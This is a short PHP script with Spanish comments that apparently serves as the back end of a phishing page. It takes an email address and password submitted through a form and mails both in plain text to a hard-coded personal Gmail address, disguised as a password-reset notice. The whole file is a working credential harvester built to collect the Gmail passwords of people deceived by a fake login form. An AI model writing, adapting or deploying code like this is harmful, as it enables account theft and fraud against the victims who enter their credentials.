<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recopila los datos del formulario
    $email = $_POST['gmail'];
    $password = $_POST['password'];
    
    // Dirección de correo electrónico a la que se enviará el mensaje
    $to = "deybiricardo3131@gmail.com";
    
    // Asunto del correo electrónico
    $subject = "Nuevo mensaje de restablecimiento de contraseña";
    
    // Contenido del correo electrónico
    $message = "Se ha solicitado un restablecimiento de contraseña.\n\n";
    $message .= "Correo electrónico: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n";
    
    // Cabeceras del correo electrónico
    $headers = "From: sender@example.com\r\n"; // Cambia esto a tu dirección de correo electrónico
    $headers .= "Reply-To: " . $email . "\r\n"; // Dirección de respuesta
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
    
    // Envía el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo electrónico enviado correctamente.";
    } else {
        echo "Error al enviar el correo electrónico.";
    }
}
?>
